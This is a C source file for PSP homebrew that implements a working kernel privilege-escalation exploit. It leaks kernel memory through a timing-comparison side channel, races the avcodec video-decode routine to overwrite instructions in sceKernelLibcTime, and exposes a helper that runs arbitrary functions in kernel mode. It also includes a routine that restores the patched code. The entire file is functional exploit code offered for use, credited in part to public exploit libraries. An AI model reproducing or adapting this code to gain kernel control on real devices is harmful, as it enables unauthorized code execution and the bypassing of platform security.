#include "mesploit.h"

#include <pspkernel.h>
#include <pspsdk.h>
#include <psputility.h>

typedef struct {
  u32 unk_0x0;
  u32 unk_0x4;
  u32 unk_0x8;
  u32 unk_0xC;
  u32 unk_0x10;
} __attribute__((packed, aligned(4))) me_params_t;  // Size: 0x14

typedef struct {
  u32 unk_0x0;  // Needs to be < 0x5100602
  u32 unk_0x4;
  u32 unk_0x8;  // Gets set to 0
  u32 unk_0xC;
  me_params_t *params_0x10;  // Point this to desired kernel addr
  u32 *unk_0x14;
  u32 unk_0x18;
  u32 unk_0x1C;
  u32 unk_0x20;
  u32 *payload1_0x24;  // Emplaced on *params_0x10
  u32 payload2_0x28;   // Emplaced on *(params_0x10 + 4)
  u32 unk_0x2C;
  u32 unk_0x30;
  u32 unk_0x34;
  u32 payload3_0x38;  // Emplaced on *(params_0x10 + 8)
  u32 unk_0x3c;
  u32 pad[0x8];  // Not actualy padding, just didnt want to type the rest out
} __attribute__((packed, aligned(4))) me_vdecode_t;  // Size: 0x60

// Imports
extern void sceKernelDcacheWritebackInvalidateAll(void);
extern void sceKernelIcacheInvalidateAll(void);
extern int sceRtcCompareTick(u64 *t1, u64 *t2);
extern int sceVideocodecDecode(me_vdecode_t *packet, u32 mode);

#define KERNEL_FLAG 0x80000000
#define MAX_ATTEMPTS 100000

/*
    We buffer out this memory so we arent invalidating random
    cache lines by doing the exploit.
    me_vdecode_t    : 0x60 bytes
    me_params_t     : 0x14 bytes
    ME DCWBI range  : 0x100 bytes
*/
static volatile u8 meBuffer[0x174] __attribute__((aligned(64)));

static volatile int isExploited = 0;
static volatile u32 libcTimeAddr = 0;

static int isGreater(u32 addr, u32 *value) {
  return sceRtcCompareTick((u64 *)value, (u64 *)addr) <= 0;
}

// Taken from the link below, credit to Davee and CelesteBlue
// https://github.com/PSP-Archive/LibPspExploit/blob/efebde1f73e7378afae78cf2633317e59829814b/kernel_read.c#L18
static u64 __attribute__((aligned(64))) kernelRead64(u32 addr) {
  u32 value[2] = {0, 0};
  u32 res[2] = {0, 0};
  int bitIdx = 0;
  for (; bitIdx < 32; bitIdx++) {
    value[1] = res[1] | (1 << (31 - bitIdx));
    if (isGreater(addr, value)) {
      res[1] = value[1];
    }
  }
  value[1] = res[1];
  bitIdx = 0;
  for (; bitIdx < 32; bitIdx++) {
    value[0] = res[0] | (1 << (31 - bitIdx));
    if (isGreater(addr, value)) {
      res[0] = value[0];
    }
  }
  return ((u64)res[1] << 32) | res[0];
}

static u32 getLibcTimeAddress() {
  /*
      This is the signature that we are looking for.
      For some reason, ghidra recognizes a 0x08
      instead of 0x0a on the jump.

      0000f7e0 09 f8 a0 00     jalr       a1
      0000f7e4 00 00 00 00     _nop
      0000f7e8 f2 3d 00 08     j          LAB_0000f7c8
      0000f7ec 21 30 40 00     _move      a2,v0
  */

  const u64 firstSig = 0x0000000000a0f809;
  const u64 secSig = 0x004030210a003df2;
  u32 targAddr = 0x88000000;

  int doContinue = 1;
  u32 result = 0;
  while (targAddr < 0x883FFFF0 && doContinue) {
    if (kernelRead64(targAddr) == firstSig) {
      if (kernelRead64(targAddr + 8) == secSig) {
        result = targAddr - 76;  // Our sig is at the end, so back up
        doContinue = 0;
      }
    }

    targAddr += 4;
  }

  return result;
}

static int __attribute__((aligned(64))) poisonBuffer(u32 args, void *argp) {
  me_vdecode_t *const decodeData = (me_vdecode_t *)&meBuffer;
  const u32 targetAddr = libcTimeAddr + 4;

  while (1) {
    // Inject the address of the libc time instructions we want to overwrite
    decodeData->params_0x10 = (me_params_t *)(targetAddr);
    sceKernelDelayThread(0);
  }

  return 0;
}

static int stopExploit() {
  isExploited = 1;
  return 0;
}

static void cleanupKernel() {
  // Repair the 3 instructions we modified
  *(u32 *)(libcTimeAddr + 0x04) = 0x8c654404;
  *(u32 *)(libcTimeAddr + 0x10) = 0x001b1ac0;
  *(u32 *)(libcTimeAddr + 0x14) = 0x03608021;
}

int compromiseKernel() {
  if (isExploited) {
    return -1;
  }

  /*
      0000f798 04 44 65 8c     lw         a1,offset DAT_00014404(v1)
      0000f79c f0 ff bd 27     addiu      sp,sp,-0x10
      0000f7a0 00 00 b0 af     sw         s0,0x0(sp)=>local_10
      0000f7a4 c0 1a 1b 00     sll        v1,k1,0xb
      0000f7a8 21 80 60 03     move       s0,k1
  */

  me_vdecode_t *const decodeData = (me_vdecode_t *)meBuffer;
  decodeData->payload1_0x24 = (u32 *)0x001b1ac0;  // Shift k1
  decodeData->payload2_0x28 = 0x27bdfff0;         // Stack setup
  decodeData->payload3_0x38 = 0xafb00000;         // Save s0 in stack

  libcTimeAddr = getLibcTimeAddress();

  if (!libcTimeAddr) {
    return -2;  // sceKernelLibcTime was not found
  }

  const int thid = sceKernelCreateThread("t", &poisonBuffer, 0x11, 0x10000,
                                         THREAD_ATTR_USER, NULL);

  if (thid <= 0) {
    return -3;  // We failed to create a thread
  }

  if (sceKernelStartThread(thid, 0, NULL) < 0) {
    return -4;  // Failed to start thread
  }

  // We abuse a vuln in avcodec.prx, so lets load it up
  const int modLoaded = sceUtilityLoadModule(PSP_MODULE_AV_AVCODEC) == 0;

  const u32 stopFunc = (u32)&stopExploit | (u32)KERNEL_FLAG;
  u32 i = MAX_ATTEMPTS;

  while (i-- > 0 && !isExploited) {
    // Reset the ME buffer and try decoding with normal parameters
    decodeData->params_0x10 =
        (me_params_t *)((u32)&meBuffer + sizeof(me_vdecode_t));

    sceVideocodecDecode(decodeData, 1);
    sceKernelDelayThread(0);

    __asm__ volatile("add $5, %0, $0" ::"r"(stopFunc));
    sceKernelLibcTime(NULL);
  }

  sceKernelTerminateDeleteThread(thid);

  // Application could have had the module loaded prior, so only unload if it
  // didnt
  if (modLoaded) {
    sceUtilityUnloadModule(PSP_MODULE_AV_AVCODEC);
  }

  if (!isExploited) {
    return -5;  // We failed the timing of the race-cond, need to try again
  }

  return 0;  // Success
}

int revertKernelExploit() {
  if (!libcTimeAddr || !isExploited) {
    return 0;
  }

  kernelExecute(&cleanupKernel);
  sceKernelDcacheWritebackInvalidateAll();
  sceKernelIcacheInvalidateAll();

  isExploited = 0;

  return 1;
}

int kernelExecute(void *funcAddr) {
  const u32 kernelAddr = (u32)funcAddr | (u32)KERNEL_FLAG;
  __asm__ volatile("add $5, %0, $0" : : "r"(kernelAddr));
  return (int)sceKernelLibcTime(NULL);
}

// Taken from below
// https://github.com/PSP-Archive/LibPspExploit/blob/efebde1f73e7378afae78cf2633317e59829814b/libpspexploit.c#L373
int isKernelMode() {
  u32 ra;
  __asm__ volatile("move %0, $ra;" : "=r"(ra));
  return (ra & KERNEL_FLAG) != 0;
}